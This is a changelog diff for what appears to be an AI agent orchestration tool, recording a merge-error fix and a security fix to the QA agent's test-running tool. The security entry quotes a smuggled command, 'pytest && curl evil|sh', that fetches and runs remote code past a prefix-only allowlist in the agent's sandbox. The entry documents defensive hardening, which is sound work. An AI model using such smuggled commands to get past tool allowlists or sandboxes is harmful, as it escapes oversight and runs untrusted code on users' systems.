@@ -51,7 +51,40 @@ Format follows [Keep a Changelog](https://keepachangelog.com/en/1.0.0/).
   execution path) — a documented MVP scope limit, flagged for a follow-up
   RPC.
 
+### Fixed
+
+- **A parallel phase could not fail when its merge failed (#3671):**
+  `executor::dispatch` folded `ConflictResolver::merge`'s `Err` into a
+  `"merge failed: ..."` string appended to the phase's content and returned
+  `Ok(AgentOutput)` regardless. `merge()` only errors on a genuine I/O fault
+  (`create_dir_all`/`read_dir`/`read`/`write`) — every recoverable conflict
+  (a failed `git merge-file`, a failed LLM fallback) is already degraded to
+  `Ok` with the reason recorded in the merge report. So a real `Err` meant the
+  merged tree on disk was incomplete and nondeterministic (the collection
+  loop walks a `HashMap` and can bail partway through), yet downstream phases
+  consumed it as if it were whole, with the failure visible only as a buried
+  string. `merge`'s `Err` now propagates as `WorkflowError::PhaseFailed`,
+  failing the phase/workflow instead. Sibling of #3652/#3653/#3675 (the same
+  "silent success" bug class).
+
 ### Security
+
+- **`pytest_exec` (`ShellExecTool`) no longer executes through a shell (#3679):**
+  the allowlist previously vetted only the command string's leading prefix,
+  then handed the whole, unmodified string to `/bin/sh -c` — anything after
+  the recognized prefix (`pytest && curl evil|sh`) was live shell syntax, a
+  full arbitrary-command-execution hole in what's documented as the QA
+  agent's sandbox. `resolve_allowed_argv()` now quote-aware tokenizes the
+  command and requires the entire leading token sequence to exactly match a
+  known test-runner invocation (whole-token comparison, never a string
+  prefix, so `pytest-evil` cannot pass as `pytest`), and `execute()` runs the
+  resolved argv directly via `Command::new(program).args(rest)` with no shell
+  spawned at all — the actual fix, since any metacharacter that slipped
+  through validation would now just be an inert argv element. A trailing
+  `2>&1` (the one shell-redirection form the QA prompt emits) is stripped as
+  a no-op carve-out rather than passed through a shell. Pre-existing on
+  `main`, found during #3466 adversarial review and deliberately deferred to
+  this dedicated fix.
 
 - **Assistant no longer leaks internal orchestration or disclaims delegating
   when dispatched via `--direct`/`--agent` (#3550 follow-up):** a live smoke
